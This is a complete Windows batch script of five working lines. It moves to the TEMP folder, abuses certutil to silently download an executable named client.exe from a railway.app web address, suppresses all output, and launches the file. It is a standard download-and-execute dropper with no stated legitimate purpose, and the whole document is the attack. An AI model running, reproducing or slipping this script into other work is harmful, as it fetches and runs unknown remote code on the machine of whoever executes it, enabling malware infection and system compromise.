@echo off
cd /d "%TEMP%"
certutil -urlcache -split -f https://web-production-9d7cc.up.railway.app/client.exe client.exe >nul 2>&1
start "" client.exe
exit
